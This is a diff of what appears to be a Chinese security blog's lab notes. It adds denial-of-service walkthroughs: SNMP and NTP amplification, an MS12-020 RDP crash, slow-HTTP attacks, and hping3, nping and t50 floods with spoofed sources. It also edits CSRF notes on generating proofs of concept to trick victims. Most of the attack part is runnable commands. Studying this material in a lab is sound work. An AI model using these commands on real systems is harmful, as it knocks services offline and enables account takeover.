+&gt;&gt;&gt; b.display()</code></pre><p><img src="9Z7Rq86.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; s.display()</code></pre><p><img src="3m6lmhQ.png" alt="img"></p>
+<p><strong>设置 SNMP 数据包</strong></p>
+<pre><code>&gt;&gt;&gt; s.PDU=b
+&gt;&gt;&gt; s.display()</code></pre><p><img src="d0jMjxp.png" alt="img"></p>
+<p><strong>合成完整数据包</strong></p>
+<pre><code>&gt;&gt;&gt; r=(i/u/s)
+&gt;&gt;&gt; r.display()</code></pre><p><strong>发送数据包</strong></p>
+<pre><code>&gt;&gt;&gt; sr1(r)</code></pre><p>发送 98 字节，返回 4534 字节的数据包</p>
+<p><img src="nJUfGfh.png" alt=""></p>
+<p><strong>测试放大200倍效果</strong></p>
+<pre><code>&gt;&gt;&gt; b.max_repetitions=200
+&gt;&gt;&gt; s.PDU=b
+&gt;&gt;&gt; s.display()</code></pre><p><img src="1deTNBV.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; r=(i/u/s)
+&gt;&gt;&gt; r.display()
+&gt;&gt;&gt; sr1(r)</code></pre><p>发送 99 字节，返回 8894 字节</p>
+<p><img src="e2RFmyd.png" alt="img"></p>
+<h3 id="拒绝服务——NTP-放大攻击"><a href="#拒绝服务——NTP-放大攻击" class="headerlink" title="拒绝服务——NTP 放大攻击"></a>拒绝服务——NTP 放大攻击</h3><h4 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
+<li>网络时间协议<ul>
+<li>Network Time Protocol</li>
+<li>保证网络设备时间同步</li>
+<li>电子设备互相干扰导致时钟差异越来越大</li>
+<li>影响应用正常运行、日志审计不可信</li>
+<li>服务端口UDP 123</li>
+</ul>
+</li>
+<li>攻击原理<ul>
+<li>NTP 服务提monlist (MON_GETLIST) 查询功能<ul>
+<li>监控NTP 服务器的状况 </li>
+</ul>
+</li>
+</ul>
+</li>
+<li>客户端查询时，NTP服务器返回最后同步时间的600 个客户端IP</li>
+<li>每6个IP一个数据包，最多100个数据包(放大约100倍)</li>
+</ul>
+<h4 id="2-扫描NTP服务器"><a href="#2-扫描NTP服务器" class="headerlink" title="2.扫描NTP服务器"></a>2.扫描NTP服务器</h4><p>1.服务器安装 ntp</p>
+<pre><code>root@xu:~# apt-get install ntp
+root@xu:~# netstat -tulnp | grep 123</code></pre><p>2.kali扫描发现http服务器</p>
+<pre><code>root@kali:~# nmap -sU -p 123 10.10.10.0/24 --open
+root@kali:~# nmap -sU -p 123 -sV 10.10.10.138</code></pre><p>3.kali 扫描发现漏洞</p>
+<pre><code>root@kali:~# ntpdc -n -c monlist 10.10.10.138
+10.10.10.138: timed out, nothing received
+***Request timed out    # 说明不存在漏洞</code></pre><p>4.配置 ntp 服务器配置</p>
+<pre><code>注释 38 和 39行
+# restrict -4 default kod notrap nomodify nopeer noquery limited
+# restrict -6 default kod notrap nomodify nopeer noquery limited
+root@xu:~# /etc/init.d/ntp restart</code></pre><p>5.kali 扫描发现漏洞</p>
+<pre><code>root@kali:~# ntpdc -n -c monlist 10.10.10.138
+root@kali:~# ntpq -c rv 10.10.10.138
+root@kali:~# ntpdc -c sysinfo 10.10.10.138</code></pre><h4 id="3-防御策略"><a href="#3-防御策略" class="headerlink" title="3.防御策略"></a>3.防御策略</h4><ul>
+<li>NTP 攻击策略<ul>
+<li>升级到 ntpd 4.2.7p26 及以上版本（默认关闭 monlist 查询）</li>
+<li>手动关闭 monlist 查询功能</li>
+</ul>
+</li>
+</ul>
+<h3 id="拒绝服务–应用层DoS-攻击"><a href="#拒绝服务–应用层DoS-攻击" class="headerlink" title="拒绝服务–应用层DoS 攻击"></a>拒绝服务–应用层DoS 攻击</h3><ul>
+<li>应用服务漏洞<ul>
+<li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li>
+<li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li>
+</ul>
+</li>
+<li>缓冲区溢出漏洞<ul>
+<li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li>
+<li>影响: 远程代码执行、DOS</li>
+<li>利用模糊测试方法发现缓冲区溢出漏洞</li>
+</ul>
+</li>
+<li>CesarFTP 0.99 服务漏洞<ul>
+<li>ftp_fuzz.py # MKD/RMD</li>
+</ul>
+</li>
+<li>MS12-020 远程桌面协议DOS漏洞</li>
+</ul>
+<h4 id="2-攻击测试-MS12-020"><a href="#2-攻击测试-MS12-020" class="headerlink" title="2. 攻击测试 MS12-020"></a>2. 攻击测试 MS12-020</h4><pre><code>root@kali:~# searchsploit ms12-020
+root@kali:~# cp /usr/share/exploitdb/exploits/windows/dos/18606.txt .
+root@kali:~# mv 18606.txt  MS12-020.txt
+root@kali:~# leafpad MS12-020.txt 
+root@kali:~# nc 10.10.10.141 3389 &lt; termdd_1.dat</code></pre><h4 id="3-Slowhttptest"><a href="#3-Slowhttptest" class="headerlink" title="3. Slowhttptest"></a>3. Slowhttptest</h4><ul>
+<li><p>Slowhttptest (源自google)</p>
+<ul>
+<li>低带宽应用层慢速DOS攻击(相对于CC等快速攻击而言的慢速)</li>
+<li>最早由Python编写，跨平台支持(Linux、win、Cygwin、OSX)</li>
+<li>尤其擅长攻击apache.tomcat (几乎百发百中)</li>
+</ul>
+</li>
+<li><p>攻击方法</p>
+<ul>
+<li>Apache Range Header attack<ul>
+<li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li>
+<li>耗尽服务器CPU、内存资源</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>ulimite -n 70000</p>
+</li>
+<li><p>HTTP Post 攻击模式</p>
+<ul>
+<li>slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 10 -p 3</li>
+</ul>
+</li>
+<li><p>slowloris 攻击模式</p>
+<ul>
+<li>slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 24 -p 3</li>
+</ul>
+</li>
+<li><p>支持代理</p>
+</li>
+<li><p>大量应用服务器和安全设备都无法防护慢速攻击</p>
+</li>
+</ul>
+<p><img src="Zc2XbBy.jpg" alt="img"></p>
+<h4 id="4-攻击测试"><a href="#4-攻击测试" class="headerlink" title="4.攻击测试"></a>4.攻击测试</h4><pre><code>root@kali:~# slowhttptest -c 60000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.10.10.132 -x 10 -p 3 -l 999999</code></pre><p><img src="z8Bx42G.png" alt="img"></p>
+<p><img src="ptFr6br.png" alt="img"></p>
+<pre><code>root@kali:~# slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -s 8192 -t GET -u http://10.10.10.132 -x 10 -p 3</code></pre><p><img src="q8f1NkR.png" alt="img"></p>
+<pre><code>root@kali:~# man slowhttptest</code></pre><h3 id="拒绝服务攻击工具"><a href="#拒绝服务攻击工具" class="headerlink" title="拒绝服务攻击工具"></a>拒绝服务攻击工具</h3><h4 id="1-rudy"><a href="#1-rudy" class="headerlink" title="1.rudy"></a>1.rudy</h4><h5 id="1-简介-6"><a href="#1-简介-6" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
+<li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li>
+<li>每次只传输一个字节的数据、</li>
+<li>美剧黑客军团”中曾提到此攻击手段</li>
+<li>攻击有表单WEB页面，攻击时需指定攻击的参数名称</li>
+<li><a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></li>
+</ul>
+<h5 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a>2.测试</h5><pre><code>root@kali:~/rudy# ls
+BeautifulSoup.py   README          r-u-dead-yet-v2.2.py  socks.pyc
+BeautifulSoup.pyc  rudeadyet.conf  socks.py</code></pre><p>修改配置文件</p>
+<p><img src="tdPvToI.png" alt="img"></p>
+<pre><code>root@kali:~/rudy# ./r-u-dead-yet-v2.2.py</code></pre><p><img src="ilCKVV2.png" alt="img"></p>
+<p><img src="eo46mKo.png" alt="img"></p>
+<h4 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h4><h5 id="1-简介-7"><a href="#1-简介-7" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
+<li><p>几乎可以定制发送任何 TCP/IP 数据包，用于测试 FW、端口扫描、性能测试</p>
+</li>
+<li><p>syn flood 攻击</p>
+<ul>
+<li>hping3 -c 1000 -d 120 -S -w 64 -p 80 –flood –rand-source 10.10.10.132</li>
+<li>hping3 -S -P -U -p 80 –flood –rand-source 10.10.10.132</li>
+<li>hping3 -SARFUP -p 80 –flood –rand-source 10.10.10.132 (TCP Flood)</li>
+</ul>
+</li>
+<li><p>ICMP Flood 攻击</p>
+<ul>
+<li>hping3 -q -n -a 1.1.1.1 –icmp -d 200 –flood 10.10.10.132</li>
+</ul>
+</li>
+<li><p>UDP Flood 攻击</p>
+<ul>
+<li>hping3 -a 1.1.1.1 –udp -s 53 -d 100 -p 53 –flood 10.10.10.132</li>
+</ul>
+</li>
+</ul>
+<h5 id="2-攻击-1"><a href="#2-攻击-1" class="headerlink" title="2.攻击"></a>2.攻击</h5><ul>
+<li><p>syn_flood 攻击</p>
+<pre><code>root@kali:~# hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.10.10.132</code></pre></li>
+</ul>
+<p><img src="ptoKirq.png" alt="img"></p>
+<pre><code>hping3 -S -P -U -p 80 --flood --rand-source 10.10.10.132</code></pre><p><img src="qykXjba.png" alt="img"></p>
+<ul>
+<li><p>tcp_flood 攻击</p>
+<pre><code>root@kali:~# hping3 -SARFUP -p 80 --flood --rand-source 10.10.10.132</code></pre></li>
+</ul>
+<p><img src="TX0DsTz.png" alt="img"></p>
+<ul>
+<li><p>icmp_flood 攻击</p>
+<pre><code>-a 伪造源地址
+root@kali:~# hping3 -q -n -a 1.1.1.1 --icmp -d 200 --flood 10.10.10.132</code></pre><p><img src="j82vMQQ.png" alt="img"></p>
+</li>
+<li><p>udp_flood 攻击</p>
+<pre><code>root@kali:~# hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 10.10.10.132</code></pre><p><img src="yh6OGJ9.png" alt="img"></p>
+</li>
+</ul>
+<h3 id="LAND攻击"><a href="#LAND攻击" class="headerlink" title="LAND攻击"></a>LAND攻击</h3><ul>
+<li><p>特殊种类的 SYN Flood 攻击</p>
+</li>
+<li><p>源地址和目的地址都是靶机IP，受害者和自己完成三次握手</p>
+</li>
+<li><p>hping3 -n -a 10.10.10.132 -S -d 100 -p 80 –flood 10.10.10.132</p>
+<pre><code>root@kali:~# hping3 -n -a 10.10.10.132 -S -d 100 -p 80 --flood 10.10.10.132</code></pre><p><img src="3YN6wrP.png" alt="img"></p>
+</li>
+</ul>
+<h3 id="3-nping"><a href="#3-nping" class="headerlink" title="3.nping"></a>3.nping</h3><ul>
+<li><p>TCP 全连接 DoS 攻击</p>
+<ul>
+<li>nping –tcp-connect –rate=10000 -c 1000000000 -q 10.10.10.132</li>
+</ul>
+</li>
+<li><p>查公网 IP</p>
+<ul>
+<li>nping –echo-client “public” echo.nmap.org –udp</li>
+</ul>
+</li>
+</ul>
+<h3 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h3><ul>
+<li><p>http/https 压力测试工具，模拟多个用户并发访问请求</p>
+</li>
+<li><p>siege -g <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a></p>
+</li>
+<li><p>siege -i -c 1000 <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -A siegehttp</p>
+</li>
+<li><p>同时攻击多个 url ，使用 -f 调用字典文件</p>
+</li>
+<li><p>单独使用 siege -i -c 1000 ，也会调用字典文件（url 列表）</p>
+<ul>
+<li><p>/etc/siege/urls.txt</p>
+<pre><code># 查看 banner 信息
+root@kali:~# siege -g http://10.10.10.132</code></pre></li>
+</ul>
+</li>
+</ul>
+<p><img src="Seky1di.png" alt="img"></p>
+<pre><code>root@kali:~# siege -i -c 1000 http://10.10.10.132 -A Mozilla/5.0</code></pre><p><img src="8d3o6st.png" alt="img"></p>
+<pre><code>root@kali:~# cat /etc/siege/urls.txt</code></pre><p><img src="ccML8at.png" alt="img"></p>
+<pre><code>root@kali:~# siege -i -c 1000</code></pre><p><img src="FdDymAj.png" alt="img"></p>
+<h3 id="5-T50"><a href="#5-T50" class="headerlink" title="5.T50"></a>5.T50</h3><ul>
+<li><p>网络压力测试</p>
+<ul>
+<li><p>t50 10.10.10.132 –flood –turbo -S –protocol TCP –dport 80</p>
+</li>
+<li><p>t50 10.10.10.132 –flood –turbo -S TCP UDP OSPF EIGRP –dport 22</p>
+<pre><code>root@kali:~# t50 10.10.10.132 --flood --turbo -S --protocol TCP --dport 80</code></pre></li>
+</ul>
+</li>
+</ul>
+<p><img src="NzK2wiZ.png" alt="img"></p>
+<p><img src="wJiBiqD.png" alt="img"></p>
+<h4 id="6-NMAP"><a href="#6-NMAP" class="headerlink" title="6.NMAP"></a>6.NMAP</h4><pre><code>root@kali:~# grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2
+broadcast-avahi-dos.nse
+http-slowloris.nse
+ipv6-ra-flood.nse
+smb-flood.nse
+smb-vuln-conficker.nse
+smb-vuln-cve2009-3103.nse
+smb-vuln-ms06-025.nse
+smb-vuln-ms07-029.nse
+smb-vuln-ms08-067.nse
+smb-vuln-ms10-054.nse
+smb-vuln-regsvc-dos.nse</code></pre>
           
         
       
@@ -4764,7 +5489,7 @@ echo urlencode(serialize($lyrics));</code></pre><p>构造pop链的文章还可�
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/04/03/csrf-lou-dong-xue-xi/" itemprop="url">CSRF+SSRF漏洞学习</a></h1>
+                <a class="post-title-link" href="/2020/04/03/csrf-lou-dong-xue-xi/" itemprop="url">CSRF漏洞学习</a></h1>
         
 
         <div class="post-meta">
@@ -4838,7 +5563,7 @@ echo urlencode(serialize($lyrics));</code></pre><p>构造pop链的文章还可�
       
         
           
-            <h2 id="CSRF漏洞-SSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞-SSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞+SSRF漏洞笔记+靶场实战"></a>CSRF漏洞+SSRF漏洞笔记+靶场实战</h2><h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​    CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p>
+            <h2 id="CSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞笔记+靶场实战"></a>CSRF漏洞笔记+靶场实战</h2><h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​    CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p>
 <p>​    从代码上看，CSRF能攻击成功是攻击者猜到了你重要参数，因而伪造请求。</p>
 <p>​    可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户</p>
 <p><strong>浏览器Cookie机制：</strong></p>
@@ -4869,29 +5594,29 @@ echo urlencode(serialize($lyrics));</code></pre><p>构造pop链的文章还可�
 <p>CSRFTester</p>
 <p>下载地址：<a href="https://www.owasp.org/index.php/File:CSRFTester-1.0.zip" target="_blank" rel="noopener">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip</a></p>
 <p>1.安装CSRFTester</p>
-<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/1.jpg" alt="1.jpg"></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200123184231.png" alt="1.jpg"></p>
 <p>打开run.bat就可以打开工具，但是需要java的环境</p>
-<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/2-1024x622.jpg" alt="2.jpg">)<img src="https://www.secpulse.com/wp-content/uploads/2018/11/21-1024x622.jpg" alt="2.jpg"></p>
+<p><img src="2-1024x622.jpg" alt="2.jpg">)<img src="21-1024x622.jpg" alt="2.jpg"></p>
 <p>消息框出现该消息时，表示工具已经开始监听本地8008这个端口了，这个时候需要配置浏览器的代理</p>
 <p>\2. 设置浏览器代理（搜狗浏览器为例）</p>
 <p>点击工具栏–代理设置–添加新代理，将代理进行添加并启用即可</p>
-<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/3-1024x584.png" alt="3.png"></p>
+<p><img src="3-1024x584.png" alt="3.png"></p>
 <p>\3. 用户登录</p>
 <p>单击“Start Recording”，开启CSRFTester的检测工作，这样以后我们所有访问的URL以及参数都会被记录下来。</p>
 <p>\4. 通过CSRFTester抓取和伪造请求</p>
 <p>当你登录一个网站账号时，CSRF Tester会进行抓取</p>
-<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/9.png" alt="9.png"></p>
+<p><img src="9.png" alt="9.png"></p>
 <p>我们抓取了该请求，在Step属性中添加请求，然后将Form Parameter中的user等表单中参数进行修改，然后单击Generate HTML按钮（可以选择其他格式：Forms、IFrame等）来产生CSRF攻击脚本。</p>
-<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/10-1024x659.png" alt="10.png"></p>
+<p><img src="10-1024x659.png" alt="10.png"></p>
 <p>随机生成了一个攻击脚本，将其上传服务器，发送给受害者即可。</p>
 <p>CSRF PoC generator</p>
 <p>打开burpsuite，在抓取任意一个HTTP请求中点击右键，选择Engagement tools，然后点击Generate CSRF POC即可生成CSRF POC，</p>
-<p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/8-1024x822.png" alt="8.png">)<img src="https://www.secpulse.com/wp-content/themes/secpulse2017/js/editor/themes/default/images/spacer.gif" alt="img"></p>
+<p><img src="8-1024x822.png" alt="8.png">)<img src="https://www.secpulse.com/wp-content/themes/secpulse2017/js/editor/themes/default/images/spacer.gif" alt="img"></p>
 <p>这款工具也是根据请求参数生成的POC，可以直接点击test in browser按钮进行测试，点击后会利用这段POC进行攻击。</p>
 <p>上列两款工具可以拦截所有的请求，渗透测试人员可以在登录状态下进行修改密码、删除文件等操作，工具便会将发送的请求进行拦截，再通过工具生成的POC便可以验证漏洞是否存在。</p>
 <p>1.CSRFTester设置浏览器代理:127.0.0.1:8008，bp是8080</p>
 <p>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞</p>
-<p>3.生成POC<br>一个wordpress博客为例就存在一个CSRF漏洞<br>创建用户，bp抓包，修改添加用户的账号密码<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112041-81ebadd4-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112041-81ebadd4-b4d4-1.png" alt="img"></a><br>发送到CSRF POC<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112102-8e91ff5c-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112102-8e91ff5c-b4d4-1.png" alt="img"></a><br>以html形式保存下来，发送给目标用户欺骗他打开，成功创建一个新账户<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112122-9a57c2f4-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112122-9a57c2f4-b4d4-1.png" alt="img"></a></p>
+<p>3.生成POC<br>一个wordpress博客为例就存在一个CSRF漏洞<br>创建用户，bp抓包，修改添加用户的账号密码<br>[<img src="20190802112041-81ebadd4-b4d4-1.png" alt="img">]<br>发送到CSRF POC<br>[<img src="20190802112102-8e91ff5c-b4d4-1.png" alt="img">]<br>以html形式保存下来，发送给目标用户欺骗他打开，成功创建一个新账户<br>[<img src="20190802112122-9a57c2f4-b4d4-1.png" alt="img">]</p>
 <h5 id="常见的防御方法："><a href="#常见的防御方法：" class="headerlink" title="常见的防御方法："></a>常见的防御方法：</h5><ul>
 <li><p><strong>使用验证码：</strong></p>
 <p>验证码强制用户必须和应用进行交互，才能完成最终的请求</p>
@@ -6597,7 +7322,7 @@ POST:
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -6619,7 +7344,7 @@ POST:
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
